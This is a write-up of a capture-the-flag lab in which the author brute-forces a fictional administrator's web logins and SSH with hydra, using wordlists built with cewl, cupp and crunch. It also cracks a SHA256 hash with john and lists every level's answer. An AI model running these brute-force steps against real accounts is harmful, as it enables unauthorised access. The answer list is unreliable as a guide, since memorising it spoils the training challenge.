<h1 align="center"><a href="https://tryhackme.com/room/checkmate">Checkmate</a></h1>
<p align="center"><img width="qw90px" src="https://github.com/user-attachments/assets/cd34dcc8-d678-4ea0-80d0-04850ce0b4dc"><br>
If you find it helpful, consider coming back for research.<br><p align="center"><a href="https://githubhttps://github.com/user-attachments/assets/f9d56f26-bf87-4309-b5d8-f98cbb0302b0com/RosanaFSS"><img src="https://img.shields.io/github/followers/RosanaFSS?label=Follow&style=for-the-badge&logo=github&color=24292e" alt="Follow Rosana on GitHub"></a>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<img src="https://img.shields.io/badge/COMPLETED-2026%2C%20MAY%2017-444444?style=for-the-badge&logo=calendar-check" alt="Completion Date"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <a href="https://www.linkedin.com/in/rosanafssantos/"><img src="https://img.shields.io/badge/Connect-LinkedIn-0077B5?style=for-the-badge&logo=linkedin&logoColor=white" alt="Connect on LinkedIn"></a></p

<br>
<br>
<h2>Task 1 &nbsp;・&nbsp; Challenge</h2> 
<p>Marco Bianchi, a systems administrator, recently deployed several internal services, including a firewall console, employee portal, social platform, and SSH access to critical infrastructure. Due to tight deadlines and operational pressure, Marco reused weak, predictable, and pattern-based passwords across multiple systems.  

Your objective is to conduct a password security assessment to identify weaknesses in Marco’s authentication practices.<br>
Please allow the machine 3 - 5 minutes to fully boot.<br>

Start by accessing the main application at http:/YourTargetIP:5000. From there, you will be guided through each stage of the challenge, uncovering and exploiting weaknesses in Marco’s password usage.</p>

<br>
<h1>Reconnaissance</h1>

```bash
# nmap -sC -sV -Pn -n -T4 -p- YourTargetIP
Starting Nmap 7.80 ( https://nmap.org ) at 2026-05-17 14:57 BST
Nmap scan report for 10.65.188.107
Host is up (0.00013s latency).
Not shown: 65530 closed ports
PORT     STATE SERVICE        VERSION
22/tcp   open  ssh            OpenSSH 9.6p1 Ubuntu 3ubuntu13.16 (Ubuntu Linux; protocol 2.0)
5000/tcp open  upnp?
| fingerprint-strings: 
|   GetRequest: 
|     HTTP/1.1 200 OK
|     Server: Werkzeug/3.1.6 Python/3.12.3
|     Date: Sun, 17 May 2026 13:57:15 GMT
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 8519
|     Connection: close
|     <!DOCTYPE html>
|     <html>
|     <head>
|     <title>Operation Checkmate</title>
|     <link href="/static/bootstrap.min.css" rel="stylesheet">
|     <script src="/static/bootstrap.bundle.min.js"></script>
|     <style>
|     body { background-color: #f8f9fa; }
|     .header-section {
|     background: linear-gradient(135deg, #0d6efd, #4e73df);
|     color: white;
|     padding: 40px 30px;
|     border-radius: 12px;
|     .instructions-box {
|     background: #fff3cd;
|     border: 1px solid #ffe69c;
|     border-radius: 12px;
|     padding: 20px 24px;
|     .nav-tabs .nav-link { font-weight: 500; }
|     .nav-tabs .nav-link.active {
|     background-color: #0d6efd;
|     color: white !important;
|     .level-card {
|     border-radius: 12px;
|     border: 1px solid #e3e6f0;
|     .verify-btn { min
|   HTTPOptions: 
|     HTTP/1.1 200 OK
|     Server: Werkzeug/3.1.6 Python/3.12.3
|     Date: Sun, 17 May 2026 13:57:30 GMT
|     Content-Type: text/html; charset=utf-8
|     Allow: OPTIONS, HEAD, GET
|     Content-Length: 0
|     Connection: close
|   RTSPRequest: 
|     <!DOCTYPE HTML>
|     <html lang="en">
|     <head>
|     <meta charset="utf-8">
|     <title>Error response</title>
|     </head>
|     <body>
|     <h1>Error response</h1>
|     <p>Error code: 400</p>
|     <p>Message: Bad request version ('RTSP/1.0').</p>
|     <p>Error code explanation: 400 - Bad request syntax or unsupported method.</p>
|     </body>
|_    </html>
5001/tcp open  commplex-link?
| fingerprint-strings: 
|   GetRequest: 
|     HTTP/1.1 200 OK
|     Server: Werkzeug/3.1.6 Python/3.12.3
|     Date: Sun, 17 May 2026 13:57:25 GMT
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 3027
|     Connection: close
|     <!doctype html>
|     <html lang="en">
|     <head>
|     <meta charset="utf-8">
|     <meta name="viewport" content="width=device-width, initial-scale=1">
|     <title>FirewallOS 
|     Sign in</title>
|     <link href="/static/bootstrap.min.css" rel="stylesheet">
|     </head>
|     <body class="bg-light">
|     <div class="container py-5">
|     <div class="row justify-content-center">
|     <div class="col-lg-5 col-md-7">
|     <div class="text-center mb-4">
|     <div class="d-inline-flex align-items-center justify-content-center rounded-circle bg-primary-subtle text-primary" style="width:64px;height:64px;">
|     <!-- shield icon -->
|     <svg width="28" height="28" viewBox="0 0 24 24" fill="currentColor" aria-hidden="true">
|   HTTPOptions: 
|     HTTP/1.1 200 OK
|     Server: Werkzeug/3.1.6 Python/3.12.3
|     Date: Sun, 17 May 2026 13:57:25 GMT
|     Content-Type: text/html; charset=utf-8
|     Allow: HEAD, GET, OPTIONS
|     Content-Length: 0
|     Connection: close
|   RTSPRequest: 
|     <!DOCTYPE HTML>
|     <html lang="en">
|     <head>
|     <meta charset="utf-8">
|     <title>Error response</title>
|     </head>
|     <body>
|     <h1>Error response</h1>
|     <p>Error code: 400</p>
|     <p>Message: Bad request version ('RTSP/1.0').</p>
|     <p>Error code explanation: 400 - Bad request syntax or unsupported method.</p>
|     </body>
|_    </html>
5002/tcp open  rfe?
| fingerprint-strings: 
|   GetRequest: 
|     HTTP/1.1 200 OK
|     Server: Werkzeug/3.1.6 Python/3.12.3
|     Date: Sun, 17 May 2026 13:57:20 GMT
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 9298
|     Connection: close
|     <!doctype html>
|     <html lang="en">
|     <head>
|     <meta charset="utf-8">
|     <meta name="viewport" content="width=device-width, initial-scale=1">
|     <title>Engineering Careers</title>
|     <link href="/static/bootstrap.min.css" rel="stylesheet">
|     <style>
|     .hero {
|     background: linear-gradient(135deg, rgba(13,110,253,.10), rgba(25,135,84,.08));
|     border: 1px solid rgba(0,0,0,.06);
|     .card-hover:hover { transform: translateY(-2px); transition: .2s ease; }
|     .badge-soft { background: rgba(13,110,253,.10); color: #0d6efd; }
|     .small-muted { color: #6c757d; }
|     </style>
|     </head>
|     <body class="bg-white">
|     <nav class="navbar navbar-expand-lg bg-white border-bottom">
|     <div class="container">
|     class="navbar-brand fw-semibold" href="#">
|   HTTPOptions: 
|     HTTP/1.1 200 OK
|     Server: Werkzeug/3.1.6 Python/3.12.3
|     Date: Sun, 17 May 2026 13:57:20 GMT
|     Content-Type: text/html; charset=utf-8
|     Allow: GET, OPTIONS, HEAD
|     Content-Length: 0
|     Connection: close
|   RTSPRequest: 
|     <!DOCTYPE HTML>
|     <html lang="en">
|     <head>
|     <meta charset="utf-8">
|     <title>Error response</title>
|     </head>
|     <body>
|     <h1>Error response</h1>
|     <p>Error code: 400</p>
|     <p>Message: Bad request version ('RTSP/1.0').</p>
|     <p>Error code explanation: 400 - Bad request syntax or unsupported method.</p>
|     </body>
|_    </html>
5003/tcp open  filemaker?
| fingerprint-strings: 
|   GetRequest: 
|     HTTP/1.1 200 OK
|     Server: Werkzeug/3.1.6 Python/3.12.3
|     Date: Sun, 17 May 2026 13:57:15 GMT
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 3004
|     Connection: close
|     <!doctype html>
|     <html lang="en">
|     <head>
|     <meta charset="utf-8">
|     <meta name="viewport" content="width=device-width, initial-scale=1">
|     <title>social.thm 
|     in</title>
|     <link href="/static/bootstrap.min.css" rel="stylesheet">
|     <style>
|     body { background: #f0f2f5; }
|     .topbar {
|     background: #ffffff;
|     border-bottom: 1px solid rgba(0,0,0,.08);
|     .brand-badge {
|     background: #1877f2;
|     color: #fff;
|     border-radius: 10px;
|     padding: 6px 10px;
|     font-weight: 700;
|     .card-soft {
|     border: 1px solid rgba(0,0,0,.08);
|     border-radius: 14px;
|     .nav-pill { border-radius: 12px; }
|     .btn-muted {
|     background: #f0f2f5;
|     border: 1px solid rgba(0,0,0,.08);
|     .btn-muted:hover
|   HTTPOptions: 
|     HTTP/1.1 200 OK
|     Server: Werkzeug/3.1.6 Python/3.12.3
|     Date: Sun, 17 May 2026 13:57:15 GMT
|     Content-Type: text/html; charset=utf-8
|     Allow: OPTIONS, HEAD, GET
|     Content-Length: 0
|     Connection: close
|   RTSPRequest: 
|     <!DOCTYPE HTML>
|     <html lang="en">
|     <head>
|     <meta charset="utf-8">
|     <title>Error response</title>
|     </head>
|     <body>
|     <h1>Error response</h1>
|     <p>Error code: 400</p>
|     <p>Message: Bad request version ('RTSP/1.0').</p>
|     <p>Error code explanation: 400 - Bad request syntax or unsupported method.</p>
|     </body>
|_    </html>
4 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service :
```

<br>
<h1>Web Content Discovery ㆍ Firewall</h1>
<p>
  
- Navigate to <code>http://YourTargetIP:5000</code>.<br>
- Learn that in the first phase of the challenge you must use <code>firewall.thm</code>:<code>5001</code> and the password is related to <strong>cdefault credentials</strong>.</p>

<img width="956" height="579" alt="image" src="https://github.com/user-attachments/assets/46a174e9-0198-4858-8bc6-236e6c1e4a5c" />

<br>
<br>
<p>

- Add <code>YourTargetIP   firewall.thm</code> in <code>/etc/hosts</code>.</p>

```bash
YourTagetIP  firewall.thm
```

<br>
<p>
  
- Navigate to <code>http://firewall.thm</code>:5001.</p>


<img width="954" height="562" alt="image" src="https://github.com/user-attachments/assets/d4368595-984c-4542-9392-b60270fc9453" />

<br>
<br>
<p>
  
- Create a wordlist named <code>level1.txt</code>.</p>

```bash
:~/Checkmate# seq 11111 99999 > level1.txt
```

<br>
<p>
  
- Execute <code>hydra</code> against the placeholder user <code>admin</code> using the wordlist just created.<br>
- Discover <code>admin</code>'s passowrd.</p>

```bash
# hydra -l admin -P level1.txt -s 5001 -f -t 4 firewall.thm http-post-form "/login:username=^USER^&password=^PASS^:F=invalid"
```

<img width="1246" height="173" alt="image" src="https://github.com/user-attachments/assets/a7cd5cf2-0de6-420b-807f-b116e6fb88c0" />

<br>
<br>
<p>

- Enter Username : <code>admin</code>, and Password : <code>12345</code>.<br>
- Hit <code>Sign in</code>.<br>
- Access <code>FirewallOS</code>'s dashboard.</p>

<img width="1305" height="691" alt="image" src="https://github.com/user-attachments/assets/bd1ccabe-f5db-443f-bb59-841ca39ca734" />

<br>
<br>
<p>

- Navigate to <code>http://YourTargetIP</code>:5000.<br>
- <code>Verify</code> the password just discovered.<br>
- Learn that in second phase of the challenge you must use <code>jobs.thm</code>:<code>5002</code> and the password is related to  <strong>common company keywords as passwords.</strong>.</p>

<img width="1310" height="531" alt="image" src="https://github.com/user-attachments/assets/c8912907-bb0a-4000-af4f-b44a181dc13a" />

<br>
<br>
<h1>Web Content Discovery ㆍ Internal Employee Login Panel</h1>
<p>

- Add <code>jobs.thm</code> to <code>/etc/hosts</code>.</p>

```bash
YourTagetIP  firewall.thm jobs.thm
```

<br>
<p>

- Navigate to <code>http://jobs.thm</code>:5002.</p>

<img width="1304" height="753" alt="image" src="https://github.com/user-attachments/assets/f2b2c0a6-1dc2-4ff1-82e6-200733508ce7" />

<br>
<br>
<p>

- Click <code>Employee Login</code>.</p>

<img width="1308" height="528" alt="image" src="https://github.com/user-attachments/assets/5b71986b-ec06-47b4-908e-38df4f81f6e0" />

<br>
<br>
<p>

- Check its source code.</p>

<img width="1305" height="132" alt="image" src="https://github.com/user-attachments/assets/dc85068f-08c9-46f1-adde-2a65b6ffbb83" />

<br>
<br>
<p>

- Use <code>cewl</code> to create a wordlist based on <strong>common company keywords as passwords</strong>.</p>

```bash
# cewl -d 2 -m 7 --lowercase --with-numbers -w level2.txt http://jobs.thm:5002
```

<img width="1249" height="104" alt="image" src="https://github.com/user-attachments/assets/dde02cff-e6fc-4dfd-9001-5752cda650ca" />

<br>
<br>
<p>

- Inspect the wordlist just created.</p>

```bash
# cat level2.txt
```

<img width="1253" height="215" alt="image" src="https://github.com/user-attachments/assets/03d491b1-1aa5-4f49-af5c-21cd0b8fb779" />

<br>
<br>
<p>

- Use <code>hydra</code>.
- Uncover <code>marco</code>'s password.</p>

```bash
# hydra -l marco -P leve2.txt -s 5002 -f -t 4 jobs.thm http-post-form "/login:username=^USER^&password=^PASS^:F=invalid"
```

<img width="1249" height="172" alt="image" src="https://github.com/user-attachments/assets/7ee6db07-407f-4d05-9cd2-4b94f0579ce3" />

<br>
<br>
<p>

- Enter Username : <code>marco</code> and Password : <code>excellence</code>.<br>
- Hit <code>Sign in</code>.</p>

<img width="1308" height="518" alt="image" src="https://github.com/user-attachments/assets/cbba9b9a-ee42-4fa1-8151-b19491e1c52e" />

<br>
<br>
<p>

- Access <code>Internal Employee Login Panel</code>.</p>

<img width="1249" height="104" alt="image" src="https://github.com/user-attachments/assets/dde02cff-e6fc-4dfd-9001-5752cda650ca" />

<br>
<br>
<h1>Web Content Discovery ㆍ Personal Info</h1>

<p>

- Navigate to <code>http://YourTargetI</code>:5000.<br>
- <code>Verify</code> the password just discovered.<br>
- Learn that in the third phase of the challenge you must navigate to <code>social.thm</code>:5003 and <strong>derive Marco's password from personal info</strong>.<br>
- Add <code>social.thm</code> to <code>/etc/hosts</code>.</p>

```bash
YourTagetIP  firewall.thm jobs.thm social.thm
```

<br>
<p>

- Navigate to <code>http://social.thm</code>:5003.<br>
- Identify <strong>Hint: Use the details from jobs.thm to generate Marco´s password</strong>.</p>

<img width="1313" height="491" alt="image" src="https://github.com/user-attachments/assets/d26a370b-2ecf-4008-945a-2d4337e05178" />

<br>
<br>
<p>

- Inspect its source code.</p>

<img width="1294" height="267" alt="image" src="https://github.com/user-attachments/assets/77741bf5-876e-48c5-a9e8-7dd4d50ff262" />

<br>
<br>
<p>

- Navigate back to <code>http://jobs.thm:5002/profile</code>.<br>
- Use <code>cewl</code> to generate a wordlist based on it.</p>

```bash
# cewl -d 2 -m 7 --lowercase --with-numbers -w level3.txt http://jobs.thm:5002/profile
```

<br>
<p>

- Inspect the wordlist just created.</p>

<img width="1245" height="296" alt="image" src="https://github.com/user-attachments/assets/775228b9-f2df-4b10-aec1-f3c2a3973179" />

<br>
<br>
<p>

- Use <code>hydra</code>.</p>

```bash
# hydra -l marco -P level3.txt -s 5003 -f -t 4 social.thm http-post-form "/login:username=^USER^&password=^PASS^:F=invalid"
Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-05-17 16:26:10
[DATA] max 4 tasks per 1 server, overall 4 tasks, 47 login tries (l:1/p:47), ~12 tries per task
[DATA] attacking http-post-form://social.thm:5003/login:username=^USER^&password=^PASS^:F=invalid
1 of 1 target completed, 0 valid passwords found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-05-17 16:26:13
```

<br>
<p>

- Did not work.  :-(<br>
- Install <code>cupp</code>.</p>

```bash
# git clone https://github.com/Mebus/cupp.git
Cloning into 'cupp'...
remote: Enumerating objects: 261, done.
remote: Counting objects: 100% (95/95), done.
remote: Compressing objects: 100% (26/26), done.
remote: Total 261 (delta 84), reused 69 (delta 69), pack-reused 166 (from 2)
Receiving objects: 100% (261/261), 2.16 MiB | 24.28 MiB/s, done.
Resolving deltas: 100% (142/142), done.
```

```bash
# ls
cupp  level1.txt  level2.txt  level3.txt
```

```bash
# cd cupp
```

```bash
# ls
CHANGELOG.md  cupp.cfg  cupp.py  LICENSE  README.md  screenshots  test_cupp.py
```

<br>
<p>

- Execute <code>cupp</code> to generate the wordlists <code>marco.txt</code>.</p>

```bash
~/Checkmate/cupp# python3 cupp.py -i
 ___________ 
   cupp.py!                 # Common
      \                     # User
       \   ,__,             # Passwords
        \  (oo)____         # Profiler
           (__)    )\   
              ||--|| *      [ Muris Kurgas | j0rgan@remote-exploit.org ]
                            [ Mebus | https://github.com/Mebus/]


[+] Insert the information about the victim to make a dictionary
[+] If you don't know all the info, just hit enter when asked! ;)

> First Name: Marco
> Surname: Bianchi
> Nickname: marky
> Birthdate (DDMMYYYY): 14021995


> Partners) name: 
> Partners) nickname: 
> Partners) birthdate (DDMMYYYY): 


> Child's name: 
> Child's nickname: 
> Child's birthdate (DDMMYYYY): 


> Pet's name: 
> Company name: 


> Do you want to add some key words about the victim? Y/[N]: N
> Do you want to add special chars at the end of words? Y/[N]: Y
> Do you want to add some random numbers at the end of words? Y/[N]:Y
> Leet mode? (i.e. leet = 1337) Y/[N]: Y

[+] Now making a dictionary...
[+] Sorting list and removing duplicates...
[+] Saving dictionary to marco.txt, counting 14800 words.
> Hyperspeed Print? (Y/n) : n
[+] Now load your pistolero with marco.txt and shoot! Good luck!
```

<img width="1313" height="748" alt="image" src="https://github.com/user-attachments/assets/fce5bc3a-49de-4107-918c-faffbf7d9182" />

<br>
<br>
<p>  

- Inspect the wordlist just created.</p>

```bash
# tail -n 12 marco.txt
ykram_95402
ykram_95414
ykram_9542
ykram_95995
ykram_995
ykram_99502
ykram_99514
ykram_9952
ykram_99524
ykram_9954
ykram_99542
ykram_99595
```

<br>
<p>

- Execute <code>hydra</code>.<br>
- Uncover <code>Marco</code>'s password.</p>

```bash
# hydra -l marco -P marco.txt -s 5003 -f -t 4 social.thm http-post-form "/login:username=^USER^&password=^PASS^:F=invalid"
```

<img width="1320" height="190" alt="image" src="https://github.com/user-attachments/assets/b3eb1988-ee4e-445c-9eea-ae2a7a51d481" />

<br>
<br>
<p>

- Enter <code>marco</code>: <code>Bianchi2495</code>.<br>
- Hit <code>Log In</code>.<br>
- Access a new dashboard.<br>
- Note that there is a hint.</p>

<img width="1311" height="576" alt="image" src="https://github.com/user-attachments/assets/0c09c983-b432-4e82-8cc2-86d7ef789bb4" />

<br>
<p>

- Navigate to <code>http://YourTargetIP</code>:5000.<br>
- <code>Verify</code> the password just discovered.<br>
- Learn that in the fourth phase of the challenge you must go back to <code>social.thm</code>:5003 where <code>Marco</code> recently uploaded a new profile picture. For privacy and storage consistency, the platform automatically renames uploaded files to the SHA256 hash of the original filename and saves them in the format (SHA256).png.<br>Your task is <strong>to identify the original filename of Marco uploaded profile picture</strong>.<br>Submit only the filename to proceed.<br>
- Note that the instructions specifically directs you to focus on the <strong>new profile picture</strong> and explicitly states the goal is to <strong>identify the original filename</strong> from the SHA256 hash.</p>


<br>
<h1>Web Content Discovery</h1>

<p>

- Go back to <code>http://social.thm</code>5003.<br>
- Check its source code.<br>
- Note that there are hashses as filenames.<br>
- Right-click the profile image, copy the hashsed filename. Or copy it from the source code.<br>
- Save the hash in <code>hash.txt</code>.</p>

```bash
# cat hash.txt
d34a569ab7aaa54dacd715ae64953455d86b768846cd0085ef4e9e7471489b7b
```

<br>
<p>

- Use <code>john</code> to crack the hash. </p>

```bash
# john --format=raw-sha256 --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

<img width="1323" height="172" alt="image" src="https://github.com/user-attachments/assets/6bf4e0f2-95b0-4bc4-99d3-328b2f3d2806" />

<br>
<br>
<p>

- Navigate to <code>http://YourTargetIP</code>:5000.<br>
- <code>Verify</code> the password just discovered.<br>
- Learn the fifth task: "Marco has revealed his password pattern on social.thm:5003, using predictable rules based on keywords and formatting. Use this information to generate a targeted wordlist and brute-force the SSH service with username marco."<br>
- Go back to <code>http://social.thm</code>:5003 and analyze the tip provided.<br>My tip for strong passsord: I take a <code>company keyword</code>, <code>capitalize</code> it, then append the <code>year</code> like 2024 or any other number and an <code>exclamation mark</code>.<br>
- The tip comes with 5 words:<br>security<br>excellence<br>innovation<br>digital<br>cloud<br>
- In the <a href="https://tryhackme.com/room/checkmate">Introduction to Wordlists</a> room TryHackMe teached to use <code>crunch</code> and <code>%</code> for an unknown charcater.</p>

<br>

```bash
# crunch 13 13 -t Security202%! -o level5.txt
```

```bash
# # tail -n 6 level5.txt
Security2024!
Security2025!
Security2026!
Security2027!
Security2028!
Security2029!
```

<img width="1336" height="338" alt="image" src="https://github.com/user-attachments/assets/15922d76-35f1-4264-aafd-9a61ad885e99" />

<br>
<br>
<p>


- Use <code>hydr</code> to discover <code>marco</code>'s SSH password.</p>

```bash
# hydra -l marco -P level5.txt YourTargetIP -t 4 ssh
```

<img width="1336" height="214" alt="image" src="https://github.com/user-attachments/assets/18875b45-e0d2-4a63-9497-0e7932ee906f" />


<br>
<br>

<p><em>Answer the questions below</em></p>

<p>What is the password for Level 1?<br>
<code>12345</code></p>

<p>What is the password for Level 2?<br>
<code>excellence</code></p>

<p>What is the password for Level 3?<br>
<code>Bianchi2495</code></p>

<p>What is the password for Level 4?<br>
<code>family</code></p>

<p>What is the password for Level 5?<br>
<code>Security2024!</code></p>

<br>
<br>
<h1>Completed</h1>

<p align="center"><img width="1200px" src="https://github.com/user-attachments/assets/010cd1f6-0360-4f2c-a61b-cd26482d9e89"><br>
                  <img width="1200px" src="https://github.com/user-attachments/assets/f80b5571-0a71-42ff-afcf-fde048022a68"><br>
                  <img width="1200px" src="https://github.com/user-attachments/assets/c206d905-eb82-4d75-94b1-d92753f571c4"></p>



<h1>My TryHackMe Journey ・ 2026, May<a id='9'></a></h1>

<div align="center"><h6>

|Day<br><br><br> |Capability<br>Score<br><br>|Room<br>Name<br><br>|Level<br><br><br>|Type<br><br><br>|Rooms<br>Completed<br><br>|Points<br><br><br>|Badges<br><br><br>|Global<br>All<br>Time<br>|Global<br>Monthly<br><br>|Brazil<br>All<br>Time<br>|Brazil<br>Monthly<br><br>|
|---------------:|-----------------:|:----------------|:---------------|:----------------------------------------:|-------------------------:|-----------------:|-----------------:|--------------------:|------------------------:|--------------------:|---------------:|
|17<br><br>  |109<br><br>   |Checkmate<br><br>|Medium<br><br>   |🚩<br><br>| 1,210<br><br>| 176,453<br><br>| 95<br><br>| 7ᵗʰ<br><br>| 27ᵗʰ<br><br>| 1ˢᵗ<br><br>| 1ˢᵗ<br><br>|

</h6></div><br>
<p align="center">Global All Time:       7ᵗʰ<br><img width="400px" src="https://github.com/user-attachments/assets/871a2732-a037-4574-b455-30f573d47450"><br>
                                                <img width="1200px" src="https://github.com/user-attachments/assets/25419f71-d647-4a1b-84bc-faccc31196ca"><br><br>
                  Global Monthly:       27ᵗʰ<br><img width="1200px" src="https://github.com/user-attachments/assets/3e93878f-a035-4c38-9e3c-e0b0816925c5"><br><br>
                  Brazil All Time:       1ˢᵗ<br><img width="1200px" src="https://github.com/user-attachments/assets/e24c00e4-9925-42da-b391-f42e6b55e488"><br><br>
                  Brazil Monthly:        1ˢᵗ<br><img width="1200px" src="https://github.com/user-attachments/assets/232f8aaf-ffe8-4877-9d5f-a1601e86f9ab"></p>

<h1 align="center">Thanks for coming!</h1>
<p align="center">Follow me on <a href="https://medium.com/@RosanaFS">Medium</a>, here on <a href="https://github.com/RosanaFSS/TryHackMe">GitHub</a>, and on <a href="https://www.linkedin.com/in/rosanafssantos/">LinkedIN</a>.</p>
